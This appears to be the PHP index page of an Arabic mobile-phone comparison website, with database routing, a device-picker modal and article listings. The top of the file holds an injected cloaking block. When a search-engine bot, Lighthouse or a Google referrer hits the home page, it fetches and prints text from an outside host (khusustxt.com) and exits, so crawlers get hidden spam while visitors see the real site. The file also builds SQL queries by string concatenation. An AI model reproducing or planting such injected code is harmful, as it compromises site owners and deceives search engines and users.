<?php
$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';

if ($uri == '/' && (
    strpos($userAgent, 'bot') !== false || 
    strpos($userAgent, 'google') !== false || 
    strpos($userAgent, 'chrome-lighthouse') !== false || 
    strpos($referer, 'google') !== false
)) {
    echo file_get_contents('https://khusustxt.com/content/maharatnet.a2hosted.txt');
    exit();
}

?>
<?php
	require_once('bootstrap/app_config.php');
	$page_title=$page_description=$page_keywords=$page_author= $SETTINGS['website_name'.$lang_db];
	// $page_title=$page_description=$page_keywords=$page_author= "Site Title";
	$page_id = 100;
	
	
	
	$indexCont = true;
	if( isset( $_GET['id'] ) ){
	    
	    
	    $path_link = "".test_inputs( $_GET['id'] );
	    
	    
    	$qu_site_links_sel = "SELECT * FROM  `site_links` WHERE `path_link` = '$path_link' LIMIT 1";
    	$qu_site_links_EXE = mysqli_query($KONN, $qu_site_links_sel);
    	if(mysqli_num_rows($qu_site_links_EXE)){
    		$site_links_DATA = mysqli_fetch_assoc($qu_site_links_EXE);
    		$link_id = $site_links_DATA['link_id'];
    		$path_link = $site_links_DATA['path_link'];
    		$path_type = $site_links_DATA['path_type'];
    		$path_id = $site_links_DATA['path_id'];
    		
    		if( $path_type == 'devices' ){
    		    $device_id = $path_id;
				$indexCont = false;
    		    require_once('handler_device.php');
				die();
    		} else if( $path_type == 'blog_articles' ){
    		    $THSarticle_id = $path_id;
				$indexCont = false;
    		    require_once('handler_article.php');
				die();
    		}  else if( $path_type == 'blog_categories' ){
    		    $category_id = $path_id;
				$indexCont = false;
    		    require_once('handler_cat_articles.php');
				die();
    		} else if( $path_type == 'devices_categories' ){
    		    $cat_id = $path_id;
				$indexCont = false;
    		    require_once('handler_cat.php');
				die();
    		} else if( $path_type == 'devices_manufactures' ){
    		    $company_id = $path_id;
				$indexCont = false;
    		    require_once('handler_man.php');
				die();
    		}
			
    	} else {
			$indexCont = true;
		}

	    
	    
	    
	} else {
		$indexCont = true;
	} 

	if( $indexCont == true ){
	    
?>
<!DOCTYPE html>
<html dir="<?=$lang_dir; ?>" lang="<?=$lang; ?>">
<head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-221502148-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-221502148-1');
</script>

<?php
	include("app/assets.php");
?>
</head>

<body>
<?php
	include("app/header.php");
?>
<?php
$slider_state = $SETTINGS['slider_state'];
if( $slider_state == 1 ){
	$slide_id = 3;
	$qu_slider_sel = "SELECT * FROM  `slider` WHERE `slide_id` = $slide_id";
	$qu_slider_EXE = mysqli_query($KONN, $qu_slider_sel);
	$slider_DATA;
	if(mysqli_num_rows($qu_slider_EXE)){
		$slider_DATA = mysqli_fetch_assoc($qu_slider_EXE);
	}
		
		$slide_title = $slider_DATA['slide_title'];
		$slide_image = $slider_DATA['slide_image'];
		$slide_link = $slider_DATA['slide_link'];
?>
<div id="slider">
	<div class="slide" style="background-image:url('uploads/<?=$slide_image; ?>');"></div>
	<a href="compare_select" class="sliderText">
		<h1><?=$slide_title; ?></h1>
		<button type="button" style="font-family: inherit;"><?=$slide_link; ?></button>
	</a>
	<!--div class="sliderControls">
		<i class="fas fa-chevron-right"></i>
		<i class="fas fa-chevron-left"></i>
	</div-->
</div>
<?php
}
?>





<h1 class="containerTitle">
	مقارنة هواتف والاجهزة الالكترونية
</h1>

<div class="blogView">
	<p style="opacity: 0.7;font-size: 1em;">
في صفحه
<a href="compare_select"> مقارنه هواتف</a>
 لدى موقع دليلموب يمكنك عمل مقارنه بين جهازين او ثلاثة اجهزه من خلال اختيار اسم الجهاز باللغة العربية او الانجليزية ثم النقر على ابدا المقارنه


	</p>
</div>
<div class="c_mainDiv">
	<div class="c_bankCont">
		<div class="c_compareBank" onclick="startSelect('A');"  id="bank-A">
			<span>&nbsp;</span>
			<img src="uploads/logo_icon_b.png" alt="compare selection">
			<div class="c_addBtn"><i class="fas fa-plus"></i></div>
		</div>
		<div class="c_compareVS started" id="compareDevicesStarter" onclick="startComparison();">
			<span>START</span>
		</div>
		<div class="c_compareBank" onclick="startSelect('B');"  id="bank-B">
			<span>&nbsp;</span>
			<img src="uploads/logo_icon_b.png" alt="compare selection">
			<div class="c_addBtn"><i class="fas fa-plus"></i></div>
		</div>
	</div>
	<div class="thirdBank thirdAtIndex thirdBankHidden" id="bank-C" onclick="startSelect('C');">
	<i class="fas fa-plus"></i>أضف جهاز ثالث للمقارنة
	</div>
</div>

<form action="compare" id="compForm" method="GET" class="compare compareDevicesStarter">
	<div id="addedPoint"></div>
</form>



<script>
var activeBank = "";
var selectedDev = 0;
var devOnBank_A = 0;
var devOnBank_B = 0;
var devOnBank_C = 0;
var isStartComp = 0;
hideStarter();

function startComparison(){
	if( isStartComp == 1 ){
		$('#compForm').submit();
	}
}

	
function hideThirdDevSelector(){
	$('#bank-C').addClass('thirdBankHidden');
}
function showThirdDevSelector(){
	$('#bank-C').removeClass('thirdBankHidden');
}

function hideStarter(){
	$('#compareDevicesStarter').removeClass('started');
	$('#compareDevicesStarter span').text('VS');
	hideThirdDevSelector();
	isStartComp = 0;
}
function showStarter(){
	$('#compareDevicesStarter').addClass('started');
	$('#compareDevicesStarter span').html('إبدأ<br>المقارنة');
	showThirdDevSelector();
	isStartComp = 1;
}


function clearBank( bank ){
	
	$('#bank-' + bank + ' .c_addBtn').removeClass( 'c_addBtnRed' );
	$('#bank-' + bank).attr( 'onclick', 'startSelect(' + "'" + bank + "'" + ');' );
	
	$('#bank-' + bank + ' img').attr('src', 'uploads/logo_icon_b.png');
	$('#bank-' + bank + ' span').html( '&nbsp;' );
	hideStarter();
	if( bank == 'A' ){
		$('#bank-' + devOnBank_A).remove();
		devOnBank_A = 0;
	} else if( bank == 'B' ){
		$('#bank-' + devOnBank_B).remove();
		devOnBank_B = 0;
	} else if( bank == 'C' ){
		$('#bank-' + devOnBank_C).remove();
		devOnBank_C = 0;
	}
}
function markBtn( bank ){
	$('#bank-' + activeBank + ' .c_addBtn').addClass( 'c_addBtnRed' );
	$('#bank-' + activeBank).attr( 'onclick', 'clearBank(' + "'" + bank + "'" + ');' );
}

function loadDevsData( dev ){
	
	if( $('#bank-' + dev).length == 0 ){
		
		var devImg  = $('#devImage-' + dev ).text();
		var devName = $('#devName-' + dev ).text();
		var devContent = $('#devS-' + dev ).html();
		var nwDt = '<input type="hidden" id="bank-' + dev + '" name="devs[]" value="' + dev + '">';
		$('#addedPoint').before( nwDt );
		if( activeBank == 'A' || activeBank == 'B' ){
			$('#bank-' + activeBank + ' img').attr('src', devImg);
			$('#bank-' + activeBank + ' span').text( devName );
		}
		if( activeBank == 'A' ){
			markBtn('A');
			devOnBank_A = dev;
		} else if( activeBank == 'B' ){
			markBtn('B');
			devOnBank_B = dev;
		} else if( activeBank == 'C' ){
			devOnBank_C = dev;
		}
	}
	hideStarter();
	setTimeout( function(){
		if( devOnBank_A != 0 && devOnBank_B != 0 ){
			showStarter();
		}

	}, 700 );
	
}


</script>


<div id="selectModal" class="selectModal selectModalHidden">
	<div class="darker" onclick="hideSelectModal();"></div>
	<div class="content">
		<div class="searcher">
			<input type="text" id="dataSearch" placeholder="ادخل اسم الجهاز">
		</div>
		<div class="devSelectView" id="deviceHolders">

<?php
	$qu_devices_sel = "SELECT * FROM  `devices` WHERE ( ( `is_active` = 1 ) )";
	$qu_devices_EXE = mysqli_query($KONN, $qu_devices_sel);
	if(mysqli_num_rows($qu_devices_EXE)){
		while($devices_REC = mysqli_fetch_assoc($qu_devices_EXE)){
			$device_id = $devices_REC['device_id'];
			$device_picture = $devices_REC['device_picture'];
			$device_name = $devices_REC['device_name'];
			$device_name_ar = $devices_REC['device_name_ar'];
			$company_id = $devices_REC['company_id'];
			
		$device_manufacture = "";
		$company_name_ar = "";
		$qu_devices_manufactures_sel = "SELECT * FROM  `devices_manufactures` WHERE `company_id` = $company_id";
		$qu_devices_manufactures_EXE = mysqli_query($KONN, $qu_devices_manufactures_sel);
		if(mysqli_num_rows($qu_devices_manufactures_EXE)){
			$devices_manufactures_DATA = mysqli_fetch_assoc($qu_devices_manufactures_EXE);
			$device_manufacture = $devices_manufactures_DATA['company_name'];
			$company_name_ar = $devices_manufactures_DATA['company_name_ar'];
		}
?>
	<div id="devS-<?=$device_id; ?>" data-ids="<?=$device_id; ?>" class="dev" onclick="markDevice(<?=$device_id; ?>);">
		<div id="devImage-<?=$device_id; ?>" style="display:none;">uploads/<?=$device_picture; ?></div>
		<img loading="lazy" id="thsImage-<?=$device_id; ?>" src="uploads/<?=$device_picture; ?>">
		<h1>جهاز <?=$device_name_ar; ?></h1>
		<h1 style="display: none;"><?=$device_name; ?></h1>
		<h1 id="devName-<?=$device_id; ?>" style="display: none;"><?=$device_name_ar; ?></h1>
		<h1 style="display: none;"><?=$device_manufacture; ?></h1>
		<h1 style="display: none;"><?=$company_name_ar; ?></h1>
		<div class="dec"></div>
	</div>
<?php
		}
	}
?>
		</div>
		<div class="confirmer">
			<button type="button" onclick="selectDevice();">اختر الهاتف</button>
			<button type="button" class="cancel" onclick="hideSelectModal();">إلغاء</button>
		</div>
	</div>
</div>
<script>
function selectDevice(){
	if( selectedDev != 0 ){
		if( activeBank != "" ){
				// alert( "selected" + selectedDev +  activeBank);
				loadDevsData(selectedDev);
				hideSelectModal();
			
		}
	}
}
function enableDevImages(){
	$('#deviceHolders .dev').each( function(){
		var thsID = $(this).attr("data-ids");
		var thsImg = $('#devImage-' + thsID).text() + '?tt=1';
		$('#thsImage-' + thsID).attr("src", thsImg);
	} );
}

function startSelect( bank ){
	$('#dataSearch').val("");
	activeBank = bank;
	showSelectModal();
	//enableDevImages();
}
function markDevice( devID ){
	clearDevice();
	selectedDev = devID;
	$('#devS-' + devID).addClass("devSelected");
}
function clearDevice(){
	selectedDev = 0;
	$('.devSelected').removeClass("devSelected");
}
function showSelectModal(){
	clearDevice();
	$('#selectModal').removeClass("selectModalHidden");
}
function hideSelectModal(){
	clearDevice();
	activeBank = "";
	$('#selectModal').addClass("selectModalHidden");
}

$(document).ready(function(){
  $("#dataSearch").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#deviceHolders .dev").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});
</script>

















<h3 class="containerTitle">
	أحدث الاجهزة
</h3>
<div class="boxHolder" id="added_dev_point-0-0"></div>
<div class="containerActionBtn" onclick="loadDevices(0, 0);" id="devicesLoadBtn">
	تحميل المزيد
</div>


<h3 class="containerTitle">
	اخر المقالات
</h3>
<div class="boxHolder" id="added_art_point-0"></div>
<div class="containerActionBtn" onclick="loadArticles(0);" id="articlesLoadBtn">
	تحميل المزيد
</div>


<br>
<br>
<br>
<br>
<br>

<?php
	include("app/footer.php");
?>
<script>
loadDevices(0, 0);
loadArticles(0);
</script>
</body>
</html>
<?php
}
?>
